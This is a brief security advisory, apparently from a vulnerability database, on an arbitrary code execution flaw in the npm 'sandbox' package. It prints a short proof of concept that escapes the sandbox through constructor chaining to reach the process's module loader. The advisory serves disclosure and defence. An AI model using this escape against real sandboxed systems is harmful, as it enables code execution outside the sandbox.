## Overview
[`sandbox`](https://www.npmjs.com/package/sandbox) is a nifty javascript sandbox for node.js.

Affected versions of the package are vulnerable to Arbitrary Code Execution. It is possible to escape the sandbox by using a combination of functions and constructors, allowing an attacker access to a process with root permissions, and load modules of their choosing in order to execute malicious code.

PoC by io Void:
```
new Function("
  return (
    this.constructor.constructor('
      return (this.process.mainModule.constructor._load
     )'
    )())"
  )()
("util").inspect("hi")
```

## Remediation
There is no fix version for `sandbox`.

## References
- [GitHub PR](https://github.com/gf3/sandbox/issues/50)
